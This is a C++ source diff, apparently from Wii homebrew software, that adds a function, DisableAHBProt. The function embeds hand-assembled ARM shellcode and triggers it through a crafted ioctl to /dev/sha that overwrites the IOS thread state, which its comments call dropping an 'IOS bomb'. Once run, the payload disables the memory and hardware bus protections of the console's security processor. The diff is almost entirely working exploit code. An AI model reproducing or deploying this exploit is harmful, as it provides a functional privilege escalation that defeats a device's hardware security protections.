@@ -23,7 +23,8 @@ Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 #include <stdlib.h>
 #include <stdarg.h>
 #include <unistd.h>
-#include <string.h>
+#include <malloc.h>
+#include <string>
 #include <vector>
 #include <algorithm>
 
@@ -176,6 +177,97 @@ const IosPatch DebugRedirectionPatch = {
 		ICInvalidateRange((void*)SRAMADDR(0xFFFF0028), 16);
 	}
 };
+
+bool DisableAHBProt()
+{
+	const std::vector<u8> IOSPayload = {
+		0xF0, 0x00, 0xF8, 0x02, //bl #8
+		0xE7, 0xFE, // b #0, keep looping main thread
+		0x00, 0x00, // padding
+		//actual disabling. it loads, and stores the value in 0xd800064 or'ed with 0x80000dfe 
+		//this gives the PPC access to the starlet's AHB devices 
+		0x4A, 0x06, // ldr  r2, [DAT_00000024] 	=  0x0d800064
+		0x4B, 0x07, // ldr  r3, [DAT_00000028] 	=  0x80000dfe
+		0x68, 0x11, // ldr  r1, [r2,#0x0]		=> 0x0d800064
+		0x43, 0x0B, // orrs r3, r1
+		0x60, 0x13, // str  r3, [r2,#0x0]		=> 0x0d800064
+		//disable HW_MEMMIRR (0xd800060) by orring with 0x00000008
+		0x4A, 0x06, // ldr  r2, [DAT_0000002c]  =  0x0d800060
+		0x23, 0x08, // movs r3, #0x8
+		0x68, 0x11, // ldr  r1, [r2,#0x0]		=> 0x0d800060
+		0x43, 0x0B, // orrs r3, r1
+		0x60, 0x13, // str  r3, [r2,#0x0]		=> 0x0d800060
+		//and finish up with setting MEM_PROT_REG(0xd804202)
+		0x4B, 0x04, // ldr  r3, [DAT_00008030]	=  0x0d804202
+		0x22, 0x00, // movs r2, #0x0
+		0x80, 0x1A, // strh r2, [r3,#0x0]		=> 0x0d804202
+		0x47, 0x70, // bx lr
+		//data used by above code
+		0x0D, 0x80, 0x00, 0x64, //DAT_00000024
+		0x80, 0x00, 0x0D, 0xFE, //DAT_00000028
+		0x0D, 0x80, 0x00, 0x60, //DAT_0000002c
+		0x0D, 0x80, 0x42, 0x02  //DAT_00000030
+	};
+
+	bool ret = true;
+	s32 fd = -1;
+	ioctlv* params = NULL;
+	try
+	{
+		//time to drop the exploit bomb on /dev/sha
+		gprintf("Preparing IOS Bomb...");
+		fd = IOS_Open("/dev/sha", 0);
+		if(fd < 0)
+			throw "Failed to open /dev/sha : " + std::to_string(fd);
+		
+		params = (ioctlv*)memalign(sizeof(ioctlv) * 4, 32);
+		if(params == NULL)
+			throw "failed to alloc IOS call data";
+
+		//overwrite the thread 0 state with address 0 (0x80000000)
+		memset(params, 0, sizeof(ioctlv) * 4);
+		params[1].data	= (void*)0xFFFE0028;
+		params[1].len	= 0;
+		DCFlushRange(params, sizeof(ioctlv) * 4);
+
+		//set code to disable ahbprot and stay in loop
+		memcpy((void*)0x80000000, IOSPayload.data(), IOSPayload.size());
+		DCFlushRange((void*)0x80000000, IOSPayload.size());
+		ICInvalidateRange((void*)0x80000000, IOSPayload.size());
+
+		//send sha init command
+		gprintf("Dropping IOS bomb...");
+		s32 callRet = IOS_Ioctlv(fd, 0x00, 1, 2, params);
+		if(callRet < 0)
+			throw "failed to send SHA init : " + std::to_string(callRet);
+		
+		//wait for it to have processed the sha init and given a timeslice to the mainthread :)
+		usleep(50000);
+	}
+	catch (const std::string& ex)
+	{
+		gprintf("Disable AHBPROT: %s", ex.c_str());
+		ret = false;
+	}
+	catch (char const* ex)
+	{
+		gprintf("Disable AHBPROT: %s", ex);
+		ret = false;
+	}
+	catch(...)
+	{
+		ret = false;
+		gprintf("Disable AHBPROT: Unknown Error Occurred");
+	}
+
+	if(fd >= 0)
+		IOS_Close(fd);
+
+	if(params)
+		free(params);
+	
+	return ret;
+}
 
 s8 IsIOSstub(u8 ios_number)
 {
